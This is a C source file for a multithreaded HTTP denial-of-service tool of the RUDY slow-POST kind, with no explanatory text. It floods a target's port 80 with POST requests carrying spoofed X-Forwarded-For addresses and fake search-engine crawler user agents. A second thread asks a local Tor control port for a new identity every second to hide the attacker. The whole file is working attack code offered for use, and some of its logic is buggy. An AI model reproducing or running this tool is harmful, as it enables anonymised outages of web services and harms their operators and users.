#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <pthread.h>
#include <time.h>

char *ip;
struct sockaddr_in sa; 
char ua[3][100];


void *rudy(void *unused) {
 int cl = 0;
 int fd = socket(AF_INET, SOCK_STREAM, 0); 
 if(connect(fd, (struct sockaddr *)&sa, sizeof(sa)) != -1) {
 char *req = malloc(2048);
 int a = rand() % (3 - 0) + 0;
 int f = rand() % (32 - 1) + 1;
 char *randem = malloc(f);
 memset(randem, 0, f);
 for(int i = 0; i < f; i++) {
  randem[i] = rand() % (0x7b - 0x61) + 0x61;
 }
 char *ipfake = malloc(16);
 int b,c,d,e;
 b = rand() % (256 - 0) + 0;
 c = rand() % (256 - 0) + 0;
 d = rand() % (256 - 0) + 0;
 e = rand() % (256 - 0) + 0;
 sprintf(ipfake, "%d.%d.%d.%d", b, c, d, e);
 sa.sin_addr.s_addr = inet_addr(ip); 
 sa.sin_port = htons(80); 
 sa.sin_family = AF_INET;
 cl = rand() % (99999 - 0) + 0;
 sprintf(req, "POST /%s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nAccept: */*\r\nX-Forwarded-For: %s\r\nConnection: keep-alive\r\nContent-Length: %d\r\n\r\n",randem, ip, ua[a], ipfake, cl);
  send(fd, req, strlen(req), MSG_NOSIGNAL);
  for(int i = 0; i < cl; i ++) {
   char a[1];
   a[0] = rand() % (0x7b - 0x61) + 0x61;
   send(fd, a, 1, MSG_NOSIGNAL);
   memset(a, 0, 1);
  }
  free(req);
  free(randem);
  free(ipfake);
 }
 close(fd);
 pthread_exit(0);
}

void *torswitch(void *unused) {
 struct sockaddr_in tor;
 tor.sin_addr.s_addr = inet_addr("127.0.0.1");
 tor.sin_port = htons(9051);
 tor.sin_family = AF_INET;
 while(1) {
  sleep(1);
  int fd = socket(AF_INET, SOCK_STREAM, 0);
  if(connect(fd, (struct sockaddr *)&tor, sizeof(tor)) != -1) {
   send(fd, "SIGNAL NEWNYM\n\n", 14, MSG_NOSIGNAL);
  } else {
   printf("tor control port cant be reached change config!\n");
  }
  close(fd);
 }
}

int makeagents() {
 strcpy(ua[0], "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)");
 strcpy(ua[1], "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)");
 strcpy(ua[2], "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)");
}

int main(int argc, char **argv) {
 srand(time(0));
 if(argc < 3) {
  printf("ip threads"); 
  return 0;
 }
 makeagents();
 ip = argv[1];
 pthread_t threads[atoi(argv[2])]; 
 pthread_t tor;
 pthread_create(&tor, 0, &torswitch, 0);
 while(1) {
  for(int i = 0; i < atoi(argv[2]); i++) {
   pthread_create(&threads[i],0, &rudy, 0); 
  }
  for(int i = 0; i < atoi(argv[2]); i++) {
   pthread_join(threads[i],0);
  }
 }
}